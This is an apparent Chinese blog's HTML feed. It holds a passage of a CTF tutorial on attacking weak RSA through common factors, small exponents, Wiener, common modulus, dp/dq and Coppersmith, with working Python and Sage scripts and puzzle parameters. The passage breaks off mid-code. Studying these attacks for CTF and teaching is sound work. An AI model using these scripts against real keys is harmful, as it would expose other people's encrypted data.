class="line">PR.&lt;x&gt; = PolynomialRing(Zmod(n))</div><div class="line">f = x + p4</div><div class="line">x0 = f.small_roots(X=2^kbits, beta=0.4)[0]</div><div class="line">print &quot;x: %s&quot; %hex(int(x0))</div><div class="line"></div><div class="line">p = p4+x0</div><div class="line">print &quot;p: &quot;, hex(int(p))</div><div class="line">assert n % p == 0</div><div class="line">q = n/int(p)</div><div class="line"></div><div class="line">print &quot;q: &quot;, hex(int(q))</div></pre></td></tr></table></figure></p><p>就是已知rsa算法中的p的高位p4，然后可以分解出p，q<br>运行结果如下：<br><img src="https://i.imgur.com/XdQ4uOv.png" alt=""></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Sage可以干什么？介绍中有这么一句：“这款开源软件的支持者称Sage能够完成从12维物体到计算全球变暖效应数学模型中的降雨量的任何事情。”Sage包含了从线性代数、微积分，到密码学、数值计算、组合数学、群论、图论、数论等各种初高等数学的计算功能。&lt;/p&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>CTF中RSA套路</title>
    <link href="http://Err0rzz.github.io/2017/11/14/CTF%E4%B8%ADRSA%E5%A5%97%E8%B7%AF/"/>
    <id>http://Err0rzz.github.io/2017/11/14/CTF中RSA套路/</id>
    <published>2017-11-14T11:16:46.000Z</published>
    <updated>2018-05-23T02:15:07.477Z</updated>
    
    <content type="html"><![CDATA[<p>以前一直用的是<a href="http://bobao.360.cn/learning/detail/3058.html" target="_blank" rel="external">http://bobao.360.cn/learning/detail/3058.html</a>这里的，可是发现这里面好久没更新了，想了想还是自己在整理一下吧。</p><a id="more"></a><p>具体RSA加解密算法就不介绍了，先看数据提取吧。</p><p><strong>需要注意的是，代码中很多地方用到了gmpy2库，安装方法参考<a href="https://www.cnblogs.com/pcat/p/5746821.html" title="pcat" target="_blank" rel="external">https://www.cnblogs.com/pcat/p/5746821.html</a></strong><br><br></p><h2 id="数据提取"><a href="#数据提取" class="headerlink" title="数据提取"></a>数据提取</h2><p>一般来说，RSA基本围绕着c,m,e,d,p,q,n这几个参数展开，但是题目一般不会直接给参数，需要我们自己手工提取。</p><ul><li><p>pem文件：针对这类文件可以直接使用openssl提取，大概使用过的方式有：</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">openssl   rsautl -encrypt -in FLAG -inkey public.pem -pubin -out flag.enc</div><div class="line">openssl   rsa -pubin -text -modulus -in warmup -in public.pem</div></pre></td></tr></table></figure></li><li><p>pcap文件：针对这类文件可以使用wireshake follow一下。这种问题一般都是写了一个交互式crypto系统，可能产生多轮交互</p></li><li>ppc模式：这种模式是上述pcap文件的交互版，会给一个端口进行一些crypto的交互，参数会在交互中给出。</li></ul><h2 id="模数分解"><a href="#模数分解" class="headerlink" title="模数分解"></a>模数分解</h2><h1 id="已知e-p-q求d"><a href="#已知e-p-q求d" class="headerlink" title="已知e,p,q求d"></a>已知e,p,q求d</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">d = gmpy2.invert(e, (p-1)*(q-1))</div></pre></td></tr></table></figure><p><br></p><h1 id="已知e-d-n求p-q"><a href="#已知e-d-n求p-q" class="headerlink" title="已知e,d,n求p,q"></a>已知e,d,n求p,q</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div></pre></td><td class="code"><pre><div class="line">import random  </div><div class="line">  </div><div class="line">def gcd(a, b):  </div><div class="line">   if a &lt; b:  </div><div class="line">     a, b = b, a  </div><div class="line">   while b != 0:  </div><div class="line">     temp = a % b  </div><div class="line">     a = b  </div><div class="line">     b = temp  </div><div class="line">   return a  </div><div class="line">  </div><div class="line">def getpq(n,e,d):  </div><div class="line">    p = 1  </div><div class="line">    q = 1  </div><div class="line">    while p==1 and q==1:  </div><div class="line">        k = d * e - 1  </div><div class="line">        g = random.randint ( 0 , n )  </div><div class="line">        while p==1 and q==1 and k % 2 == 0:  </div><div class="line">            k /= 2  </div><div class="line">            y = pow(g,k,n)  </div><div class="line">            if y!=1 and gcd(y-1,n)&gt;1:  </div><div class="line">                p = gcd(y-1,n)  </div><div class="line">                q = n/p  </div><div class="line">    return p,q  </div><div class="line">  </div><div class="line">def main():  </div><div class="line"> </div><div class="line">    n = 0xa66791dc6988168de7ab77419bb7fb0c001c62710270075142942e19a8d8c51d053b3e3782a1de5dc5af4ebe99468170114a1dfe67cdc9a9af55d655620bbab  </div><div class="line">    e =  0x10001</div><div class="line">    d =  0x123c5b61ba36edb1d3679904199a89ea80c09b9122e1400c09adcf7784676d01d23356a7d44d6bd8bd50e94bfc723fa87d8862b75177691c11d757692df8881</div><div class="line"></div><div class="line">    p,q = getpq(n,e,d)  </div><div class="line">    print &quot;p: &quot;+hex(p)</div><div class="line">    print &quot;q: &quot;+hex(q)  </div><div class="line">  </div><div class="line">if __name__ == &apos;__main__&apos;:  </div><div class="line">    main()</div></pre></td></tr></table></figure><p><br></p><h1 id="在线分解n"><a href="#在线分解n" class="headerlink" title="在线分解n"></a>在线分解n</h1><p><a href="http://factordb.com" target="_blank" rel="external">http://factordb.com</a><br>通过在此类网站上查询n，如果可以分解或者之前分解成功过，那么可以直接得到p和q</p><h1 id="yafu分解n"><a href="#yafu分解n" class="headerlink" title="yafu分解n"></a>yafu分解n</h1><p><img src="https://i.imgur.com/dVDqGFL.png" alt=""><br>直接打开程序，然后输入factor($n)，<code>$n</code>为模数，此方法比上面的在线要好用很多<br><br></p><h1 id="公约数分解n"><a href="#公约数分解n" class="headerlink" title="公约数分解n"></a>公约数分解n</h1><p>识别此类题目，通常会发现题目给了多个n，均不相同，并且都是2048bit，4096bit级别，无法正面硬杠，并且明文都没什么联系，e也一般取65537。可以直接<code>gcd(n1,n2)</code>求出一个因数。如下:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">n1=9051013965404084482870087864821455535159008696042953021965631089095795348830954383127323853272528967729311045179605407693592665683311660581204886571146327720288455874927281128121117323579691204792399913106627543274457036172455814805715668293705603675386878220947722186914112990452722174363713630297685159669328951520891938403452797650685849523658191947411429068829734053745180460758604283051344339641429819373112365211739216160420494167071996438506850526168389386850499796102003625404245645796271690310748804327</div><div class="line">n2=13225948396179603816062046418717214792668512413625091569997524364243995991961018894150059207824093837420451375240550310050209398964506318518991620142575926623780411532257230701985821629425722030608722035570690474171259238153947095310303522831971664666067542649034461621725656234869005501293423975184701929729170077280251436216167293058560030089006140224375425679571181787206982712477261432579537981278055755344573767076951793312062480275004564657590263719816033564139497109942073701755011873153205366238585665743</div></pre></td></tr></table></figure></p><p>可以直接用公约数分解n，求得p,q<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">def gcd(a, b):</div><div class="line">   if a &lt; b:</div><div class="line">     a, b = b, a</div><div class="line">   while b != 0:</div><div class="line">     temp = a % b</div><div class="line">     a = b</div><div class="line">     b = temp</div><div class="line">   return a</div><div class="line"></div><div class="line">n1=9051013965404084482870087864821455535159008696042953021965631089095795348830954383127323853272528967729311045179605407693592665683311660581204886571146327720288455874927281128121117323579691204792399913106627543274457036172455814805715668293705603675386878220947722186914112990452722174363713630297685159669328951520891938403452797650685849523658191947411429068829734053745180460758604283051344339641429819373112365211739216160420494167071996438506850526168389386850499796102003625404245645796271690310748804327</div><div class="line">n2=13225948396179603816062046418717214792668512413625091569997524364243995991961018894150059207824093837420451375240550310050209398964506318518991620142575926623780411532257230701985821629425722030608722035570690474171259238153947095310303522831971664666067542649034461621725656234869005501293423975184701929729170077280251436216167293058560030089006140224375425679571181787206982712477261432579537981278055755344573767076951793312062480275004564657590263719816033564139497109942073701755011873153205366238585665743</div><div class="line">print &quot;p: &quot;+str(gcd(n1,n2))</div><div class="line">print &quot;q1: &quot;+str(n1/gcd(n1,n2))</div><div class="line">print &quot;q2: &quot;+str(n2/gcd(n1,n2))</div></pre></td></tr></table></figure></p><p><br></p><h2 id="低加密指数攻击"><a href="#低加密指数攻击" class="headerlink" title="低加密指数攻击"></a>低加密指数攻击</h2><h1 id="e-3时的小明文攻击"><a href="#e-3时的小明文攻击" class="headerlink" title="e=3时的小明文攻击"></a>e=3时的小明文攻击</h1><p>当e=3时，如果明文过小，导致明文的三次方仍然小于n，那么通过直接对密文三次开方，即可得到明文。如果明文的三次方虽然比n大，但是大不了多少，则可以爆破。如下代码:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">i=0</div><div class="line">   while 1:</div><div class="line">   if(gmpy2.root(c+i*N, 3)[1]==1):</div><div class="line">     print gmpy2.root(c+i*N, 3)</div><div class="line">     break</div><div class="line">   i=i+1</div></pre></td></tr></table></figure></p><p><br></p><h1 id="低加密指数广播攻击"><a href="#低加密指数广播攻击" class="headerlink" title="低加密指数广播攻击"></a>低加密指数广播攻击</h1><p>如果选取的加密指数较低，并且使用了相同的加密指数给一个接受者的群发送相同的信息，那么可以进行广播攻击得到明文。<br>这个识别起来比较简单，一般来说都是给了三组加密的参数和明密文，其中题目很明确地能告诉你这三组的明文都是一样的，并且e都取了一个较小的数字。<br><img src="https://i.imgur.com/H7Zec1s.png" alt=""><br><br></p><h2 id="低解密指数攻击"><a href="#低解密指数攻击" class="headerlink" title="低解密指数攻击"></a>低解密指数攻击</h2><p>识别：e看起来特别大就行了<br>github上有开源的攻击代码<a href="https://github.com/pablocelayes/rsa-wiener-attack" title="rsa-wiener-attack" target="_blank" rel="external">https://github.com/pablocelayes/rsa-wiener-attack</a><br>这里注意一个细节问题，如果在运行脚本的时候报错，请在脚本前加上：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">import   sys</div><div class="line">sys.setrecursionlimit(10000000)</div></pre></td></tr></table></figure></p><p>题目：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">Bob is extremely paranoid, so he decided that just one RSA encryption is not enough. Before sending his message to Alice, he forced her to create 5 public keys so he could encrypt his message 5 times! Show him that he still is not secure.</div><div class="line"></div><div class="line"></div><div class="line">Here are the 5 public keys that Bob used, each in the format of (N, e):</div><div class="line">(9247606623523847772698953161616455664821867183571218056970099751301682205123115716089486799837447397925308887976775994817175994945760278197527909621793469, 11)</div><div class="line">(9247606623523847772698953161616455664821867183571218056970099751301682205123115716089486799837447397925308887976775994817175994945760278197527909621793469, 41)</div><div class="line">(9247606623523847772698953161616455664821867183571218056970099751301682205123115716089486799837447397925308887976775994817175994945760278197527909621793469, 67623079903)</div><div class="line">(9247606623523847772698953161616455664821867183571218056970099751301682205123115716089486799837447397925308887976775994817175994945760278197527909621793469, 5161910578063)</div><div class="line">(9247606623523847772698953161616455664821867183571218056970099751301682205123115716089486799837447397925308887976775994817175994945760278197527909621793469, 175238643578591220695210061216092361657427152135258210375005373467710731238260448371371798471959129039441888531548193154205671)</div><div class="line"></div><div class="line">Here is his encrypted message:</div><div class="line">7117565509436551004326380884878672285722722211683863300406979545670706419248965442464045826652880670654603049188012705474321735863639519103720255725251120</div></pre></td></tr></table></figure></p><p>根据题意，用一样的n不同的e来加密5次，其实效果和用5个e的乘积加密一次是一样的。其实如果5个e的乘积来加密的话，e很大的话就可以用低解密指数攻击来了。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div></pre></td><td class="code"><pre><div class="line">import ContinuedFractions, Arithmetic, RSAvulnerableKeyGenerator</div><div class="line"></div><div class="line"></div><div class="line">def hack_RSA(e,n):</div><div class="line">    &apos;&apos;&apos;</div><div class="line">    Finds d knowing (e,n)</div><div class="line">    applying the Wiener continued fraction attack</div><div class="line">    &apos;&apos;&apos;</div><div class="line">    frac = ContinuedFractions.rational_to_contfrac(e, n)</div><div class="line">    convergents = ContinuedFractions.convergents_from_contfrac(frac)</div><div class="line">    </div><div class="line">    for (k,d) in convergents:</div><div class="line">        </div><div class="line">        #check if d is actually the key</div><div class="line">        if k!=0 and (e*d-1)%k == 0:</div><div class="line">            phi = (e*d-1)//k</div><div class="line">            s = n - phi + 1</div><div class="line">            # check if the equation x^2 - s*x + n = 0</div><div class="line">            # has integer roots</div><div class="line">            discr = s*s - 4*n</div><div class="line">            if(discr&gt;=0):</div><div class="line">                t = Arithmetic.is_perfect_square(discr)</div><div class="line">                if t!=-1 and (s+t)%2==0:</div><div class="line">                    print(&quot;Hacked!&quot;)</div><div class="line">                    return d</div><div class="line"></div><div class="line"></div><div class="line">(n1,e1)=(9247606623523847772698953161616455664821867183571218056970099751301682205123115716089486799837447397925308887976775994817175994945760278197527909621793469, 11)</div><div class="line">(n2,e2)=(9247606623523847772698953161616455664821867183571218056970099751301682205123115716089486799837447397925308887976775994817175994945760278197527909621793469, 41)</div><div class="line">(n3,e3)=(9247606623523847772698953161616455664821867183571218056970099751301682205123115716089486799837447397925308887976775994817175994945760278197527909621793469, 67623079903)</div><div class="line">(n4,e4)=(9247606623523847772698953161616455664821867183571218056970099751301682205123115716089486799837447397925308887976775994817175994945760278197527909621793469, 5161910578063)</div><div class="line">(n5,e5)=(9247606623523847772698953161616455664821867183571218056970099751301682205123115716089486799837447397925308887976775994817175994945760278197527909621793469, 175238643578591220695210061216092361657427152135258210375005373467710731238260448371371798471959129039441888531548193154205671)</div><div class="line"></div><div class="line">c=7117565509436551004326380884878672285722722211683863300406979545670706419248965442464045826652880670654603049188012705474321735863639519103720255725251120</div><div class="line">e=e1*e2*e3*e4*e5%n1</div><div class="line">d=hack_RSA(e,n1)</div><div class="line"></div><div class="line"></div><div class="line">m=pow(c,d,n1)</div><div class="line">print &apos;&#123;:x&#125;&apos;.format(m).decode(&apos;hex&apos;)</div></pre></td></tr></table></figure></p><p>运行的时候如果报import包不存在，那是因为没有把<a href="https://github.com/pablocelayes/rsa-wiener-attack" title="rsa-wiener-attack" target="_blank" rel="external">https://github.com/pablocelayes/rsa-wiener-attack</a>里面所有的py文件放在同一目录下。</p><p><br></p><h2 id="共模攻击"><a href="#共模攻击" class="headerlink" title="共模攻击"></a>共模攻击</h2><p>识别：若干次加密，e不同，n相同，m相同。就可以在不分解n和求d的前提下，解出明文m。<img src="https://i.imgur.com/w8UoOQ2.png" alt=""><br>已知e1,e2,n,c1,c2<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line">def egcd(a, b):</div><div class="line">    if a == 0:</div><div class="line">      return (b, 0, 1)</div><div class="line">    else:</div><div class="line">      g, y, x = egcd(b % a, a)</div><div class="line">      return (g, x - (b // a) * y, y)</div><div class="line">def modinv(a, m):</div><div class="line">    g, x, y = egcd(a, m)</div><div class="line">    if g != 1:</div><div class="line">      raise Exception(&apos;modular inverse does not exist&apos;)</div><div class="line">    else:</div><div class="line">      return x % m</div><div class="line"></div><div class="line">s = egcd(e1, e2)</div><div class="line">s1 = s[1]</div><div class="line">s2 = s[2]</div><div class="line"></div><div class="line">if s1&lt;0:</div><div class="line">   s1 = - s1</div><div class="line">   c1 = modinv(c1, n)</div><div class="line">elif s2&lt;0:</div><div class="line">   s2 = - s2</div><div class="line">   c2 = modinv(c2, n)</div><div class="line">m=(pow(c1,s1,n)*pow(c2,s2,n)) % n</div><div class="line">print &apos;&#123;:x&#125;&apos;.format(m).decode(&apos;hex&apos;)</div></pre></td></tr></table></figure></p><p><br></p><h2 id="已知dp-dq求解"><a href="#已知dp-dq求解" class="headerlink" title="已知dp,dq求解"></a>已知dp,dq求解</h2><p>其实这种方法很简单，但是由于我当时做的时候查了好久dp,dq是什么，所以还是记录下来扫个坑吧。<br>这种参数是为了让解密的时候更快速产生的，其中:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">dp=d%(p-1)</div><div class="line">dq=d%(q-1)</div></pre></td></tr></table></figure></p><p>解密全部代码如下:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">InvQ=gmpy2.invert(q,p)</div><div class="line">mp=pow(c,dp,p)</div><div class="line">mq=pow(c,dq,q)</div><div class="line">m=(((mp-mq)*InvQ)%p)*q+mq</div><div class="line">print &apos;&#123;:x&#125;&apos;.format(m).decode(&apos;hex&apos;)</div></pre></td></tr></table></figure></p><p><br></p><h2 id="隐藏小私有指数δ的RSA后门密钥生成算法"><a href="#隐藏小私有指数δ的RSA后门密钥生成算法" class="headerlink" title="隐藏小私有指数δ的RSA后门密钥生成算法"></a>隐藏小私有指数δ的RSA后门密钥生成算法</h2><p>以下题目来自于hctf2016<br><a href="http://0x48.pw/2016/11/28/0x28/" title="出题人的wp" target="_blank" rel="external">http://0x48.pw/2016/11/28/0x28/</a><br><a href="https://github.com/Hcamael/ctf-library/tree/master/RSA1" title="题目" target="_blank" rel="external">https://github.com/Hcamael/ctf-library/tree/master/RSA1</a><br><a href="https://github.com/Hcamael/ctf-library/blob/master/RSA1/rsa1_payload.py" title="payload" target="_blank" rel="external">https://github.com/Hcamael/ctf-library/blob/master/RSA1/rsa1_payload.py</a><br>算法原理如下：<br><img src="https://i.imgur.com/5thK6MI.png" alt=""><br>攻击方法也很简单<br><img src="https://i.imgur.com/5UCVMXO.png" alt=""></p><p>解题关键是在下图<br><img src="https://i.imgur.com/Om8Q7iX.png" alt=""><br><img src="https://i.imgur.com/faCg1Q1.png" alt=""><br>根据<strong>rsa-wiener-attack</strong>我们可以知道，在rsa算法中，如果密钥d特别小，则我们可以根据e,n直接求出d，所以上图满足条件。</p><p>而当我们求出了那两个东西(原谅我打不出来…),则和<strong>已知e,d,n求p,q</strong>的情况一样了，当p,q已知的时候就可以解出d了</p><h2 id="基于隐藏素数因子的RSA-HPβ算法-高比特位已知分解"><a href="#基于隐藏素数因子的RSA-HPβ算法-高比特位已知分解" class="headerlink" title="基于隐藏素数因子的RSA-HPβ算法(高比特位已知分解)"></a>基于隐藏素数因子的RSA-HPβ算法(高比特位已知分解)</h2><p>以下题目来自于hctf2016<br><a href="https://github.com/Hcamael/ctf-library/tree/master/RSA2" title="题目" target="_blank" rel="external">https://github.com/Hcamael/ctf-library/tree/master/RSA2</a><br>payload:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">https://github.com/Hcamael/ctf-library/blob/master/RSA2/rsa2_payload.py</div><div class="line">https://github.com/Hcamael/ctf-library/blob/master/RSA2/rsa2_payload.sage</div></pre></td></tr></table></figure></p><p>该后门算法依赖于<strong>Coppersmith partial information attack</strong>算法, sage实现该算法，sage安装详细看我的另一篇关于sage的安装。</p><p>Coppersmith partial information attack算法可以理解成，当我们已知素数p或者q的前一定位数，可以根据这个算法还原完整的p，q。<br>算法实现代码：<a href="https://github.com/Gao-Chuan/RSA-and-LLL-attacks" target="_blank" rel="external">https://github.com/Gao-Chuan/RSA-and-LLL-attacks</a></p><p>例题如下：<br><img src="https://i.imgur.com/P7UXiV6.png" alt=""></p><p>仔细观察算法，n是靠t,u,r来拼接成，而u是根据p的前5k/16位进行des转置得到的，所以<strong>当我们已知n的前提下，相当于我们已知p的前5k/16位</strong>。这就是我们利用的点。如下图：<br><img src="https://i.imgur.com/jtz02KN.png" alt=""></p><p>利用代码如下:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">p4 = 0xf3a5f928e11c5901f9f4289e513f046748efb99d4f8e706e207a943e1d2c9df43feab38e20c2106d87167e5501ac41adfc4912732457103a4359e5b433da78f39ad6f206b8f170192aa0841feb501ce1</div><div class="line">n = 0x7e7007c7c85788b9b77cda64c9b3f5d2a795fe1b1f8d3f120288a30a168c3ea932c7574700ff0f596c5ad04a703756aedc66b9b9e44911d55f0a72a1cc1a569cee02a84499cdb091b8471a8e6cc0ebca583dfd6fb8d5fecf32ff67d2ddeaaaaf9c71a10009b4218fc57743675f283d22734ac7ade2ca240772d11b5783755378f7c30988f41d4a9d62561ea6e5f2f21d3d44e8689e781d3f61356123929457d17b07a1d04741bf970afb590cd820dd12cf88f68b0e896388f433fd2adf3354353c9c56abb0cfea223387e6d0b2df10e450c621ac153e47369f888fdc0b39c842a5ddc6a11339862ccdb4be97a81445205fb8f8bde9daaad5d0dc2ea5bd3b8c43</div><div class="line"></div><div class="line">//p的位数</div><div class="line">pbits = 1024</div><div class="line">//p未知的位数</div><div class="line">kbits = pbits - p4.nbits()</div><div class="line">print p4.nbits()</div><div class="line">p4 = p4 &lt;&lt; kbits</div><div class="line"></div><div class="line">PR.&lt;x&gt; = PolynomialRing(Zmod(n))</div><div class="line"></div><div class="line">//f是原始的p</div><div class="line">f = x + p4</div><div class="line">x0 = f.small_roots(X=2^kbits, beta=0.4)[0]</div><div class="line">print &quot;x: %s&quot; %hex(int(x0))</div><div class="line"></div><div class="line">p = p4+x0</div><div class="line">print &quot;p: &quot;, hex(int(p))</div><div class="line">assert n % p == 0</div><div class="line">q = n/int(p)</div><div class="line"></div><div class="line">print &quot;q: &quot;, hex(int(q))</div></pre></td></tr></table></figure></p><p><img src="https://i.imgur.com/Vwccm9g.png" alt=""><br><br></p><h2 id="第二届强网杯-nextrsa-Coppersmith"><a href="#第二届强网杯-nextrsa-Coppersmith" class="headerlink" title="第二届强网杯_nextrsa_Coppersmith"></a>第二届强网杯_nextrsa_Coppersmith</h2><p>题目描述是，加密指数e=3，同时已知明文的高位，参数如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"># n=0x79982a272b9f50b2c2bc8b862ccc617bb39720a6dc1a22dc909bbfd1243cc0a03dd406ec0b1a78fa75ce5234e8c57e0aab492050906364353b06ccd45f90b7818b04be4734eeb8e859ef92a306be105d32108a3165f96664ac1e00bba770f04627da05c3d7513f5882b2807746090cebbf74cd50c0128559a2cc9fa7d88f7b2d</div><div class="line"># e=0x3</div><div class="line"># c=0x381db081852c92d268b49a1b9486d724e4ecf49fc97dc5f20d1fad902b5cdfb49c8cc1e968e36f65ae9af7e8186f15ccdca798786669a3d2c9fe8767a7ae938a4f9115ae8fed4928d95ad550fddd3a9c1497785c9e2279edf43f04601980aa28b3b52afb55e2b34e5b175af25d5b3bd71db88b3b31e48a177a469116d957592c</div><div class="line"># b=0xfedcba98765432100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000</div><div class="line"># m=b+x (x:64bit)</div></pre></td></tr></table></figure></p><p>其中不知道的就是64比特的x，不过根据以下代码就可以算出x：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">e = 0x3</div><div class="line">b = b=0xfedcba98765432100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000</div><div class="line">n = 0x79982a272b9f50b2c2bc8b862ccc617bb39720a6dc1a22dc909bbfd1243cc0a03dd406ec0b1a78fa75ce5234e8c57e0aab492050906364353b06ccd45f90b7818b04be4734eeb8e859ef92a306be105d32108a3165f96664ac1e00bba770f04627da05c3d7513f5882b2807746090cebbf74cd50c0128559a2cc9fa7d88f7b2d</div><div class="line">c=0x381db081852c92d268b49a1b9486d724e4ecf49fc97dc5f20d1fad902b5cdfb49c8cc1e968e36f65ae9af7e8186f15ccdca798786669a3d2c9fe8767a7ae938a4f9115ae8fed4928d95ad550fddd3a9c1497785c9e2279edf43f04601980aa28b3b52afb55e2b34e5b175af25d5b3bd71db88b3b31e48a177a469116d957592c</div><div class="line"></div><div class="line">kbits=64</div><div class="line">PR.&lt;x&gt; = PolynomialRing(Zmod(n))</div><div class="line">f = (x + b)^e-c</div><div class="line">x0 = f.small_roots(X=2^kbits, beta=1)[0]</div><div class="line">print &quot;x: %s&quot; %hex(int(x0))</div></pre></td></tr></table></figure></p><h2 id="强网杯-nextrsa-nextprime"><a href="#强网杯-nextrsa-nextprime" class="headerlink" title="强网杯_nextrsa_nextprime"></a>强网杯_nextrsa_nextprime</h2><p>参数如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"># n=0x78e2e04bdc50ea0b297fe9228f825543f2ee0ed4c0ad94b6198b672c3b005408fd8330c36f55d36fb129d308c23e5cb8f4d61aa7b058c23607cef83d63c4ed0f066fc0b3c0062a2ac68c75ca8035b3bd7a320bdf29cfcf6cc30377743d2a8cc29f7c588b8043412366ab69ec824309cb1ef3851d4fb14a1f0a58e4a1193f5518fa1d0c159621e1f832b474182593db2352ef05101bf367865ad26efe14fce977e9e48d3310a18b67991958d1a01bd0f3276a669866f4deaef2a68bfaefd35fe2ba5023a22c32ae8b2979c26923ee3f855363f18d8d58bb1bc3b7f585c9d9f6618c727f0f7b9e6f32af2864a77402803011874ed2c65545ced72b183f5c55d4d1</div><div class="line"># e=0x10001</div><div class="line"># nextprime(p)*nextprime(q)=0x78e2e04bdc50ea0b297fe9228f825543f2ee0ed4c0ad94b6198b672c3b005408fd8330c36f55d36fb129d308c23e5cb8f4d61aa7b058c23607cef83d63c4ed0f066fc0b3c0062a2ac68c75ca8035b3bd7a320bdf29cfcf6cc30377743d2a8cc29f7c588b8043412366ab69ec824309cb1ef3851d4fb14a1f0a58e4a1193f5a58ee70a59ac06b64dbe04b876ff69436b78cf03371f2062707897bf4e580870e42b5e62709b69f6d4939ac5641ea0f29de44aaee8f2fcd0f66aaa720b584f7c801e52ce7cd41db45ceb99ebd7b51bef8d0cd2deb5c50b59f168276c9c98d46a1c37bd3d6ef81f2c6e89028680a172e00d92dd8b392135112dd16efab57d00b26b9</div><div class="line"># c=0x1c3588ac81ec3d1b439cfd2d5e6e8a5a95c8f95aaeff1b0ba49276ade80435323f307a17006ae2ffb4ca321e54387d9b33ed7ccda3117f7bc8d247ffd2ccdd67b7e2aad3d908d0a5187a73d13d532c1cf41758e2743bd4359bf72a99bbf0d716bb171cf636bd56acee9551cbb8af25f32583facbd25aed232659d24580c5a30a080e2860790a65422f7c442559c3042d37fdd7e8c1dd604252a2cbff8c74e5a0b6a0dfb9dcfed9eed515705ab9214dcf2dabce7b354040940613d065918079b3197da948b6d1d7daccc417069f7102fd2525e879fe69b6d5fb39e1dd6c0a9a9087dcc809294d7774efb42829f6124dff4af44f308977d1f91422c63073176026</div></pre></td></tr></table></figure></p><p>方法一：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div 